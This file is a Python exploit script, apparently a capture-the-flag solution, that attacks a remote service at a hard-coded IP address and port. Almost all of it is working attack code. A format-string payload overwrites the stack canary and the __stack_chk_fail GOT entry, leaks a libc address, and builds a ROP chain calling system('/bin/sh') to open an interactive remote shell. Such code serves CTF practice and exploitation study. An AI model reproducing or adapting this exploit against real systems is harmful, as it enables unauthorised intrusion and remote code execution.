#!/usr/bin/python
import socket
import struct
import sys
import telnetlib

def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        c = f.read(1)
        if len(c) == 0:
            return data
        data += c
    return data

def p(v):
    return struct.pack('<I', v)

def u(v):
    return struct.unpack('<I', v)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('175.119.158.131', 17171))
f = s.makefile('rw', bufsize=0)

# 7 goes goes to s
# stack canary at 263
# libc at 267
# stack addr at 264

# each write is a 16 bit write
def make_fmt_str(writes, addr_offset=0, print_offset=0):
    fmt = ''
    if addr_offset % 4 != 0:
        pad = 4 - addr_offset % 4
        fmt += 'A' * pad
        addr_offset += pad
        print_offset += pad

    addr_idx = 7 + addr_offset / 4

    for a, _ in writes:
        fmt += p(a)
        print_offset += 4
    assert '\0' not in fmt
    assert '\n' not in fmt

    for _, v in writes:
        delta = (v - print_offset) & 0xffff
        if delta < 16:
            fmt += 'A' * delta
        else:
            fmt += '%' + str(delta) + 'u'
        fmt += '%' + str(addr_idx) + '$hn'
        addr_idx += 1
        print_offset = v
    assert '\0' not in fmt
    assert '\n' not in fmt

    return fmt

stack_canary_addr = 0xb7565954
stack_chk_fail_got = 0x80497E4
pop4ret = 0x804859c
main = 0x0804849B

rop = p(main)
fmt = '|%267$04x|END'
addr_offset = len(rop) + len(fmt)
print_offset = len(rop) + 13

fake_canary = 0x41

writes = []
writes.append((stack_canary_addr, fake_canary))
writes.append((stack_chk_fail_got, pop4ret & 0xffff))
writes.append((stack_chk_fail_got+2, pop4ret >> 16))

fmt += make_fmt_str(writes, addr_offset, print_offset)

payload = rop + fmt

assert '\0' not in payload
assert '\n' not in payload

f.write(payload + '\n')
data = readuntil(f, '|END')
if '|END' not in data:
    sys.exit(0)

libc_addr = int(data.split('|')[1], 16)
libc_base = libc_addr - 0x1873e
print 'libc_base =', hex(libc_base)

system = libc_base + 0x0003b180
binsh = libc_base + 0x15f61b

rop = ''
rop += p(system)
rop += 'BBBB'
rop += p(binsh)

assert '\0' not in rop
assert '\n' not in rop

addr_offset = len(rop)
print_offset = len(rop)

writes = []
writes.append((stack_canary_addr, fake_canary+1))
fmt = make_fmt_str(writes, addr_offset, print_offset)

payload = rop + fmt
f.write(payload + '\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()
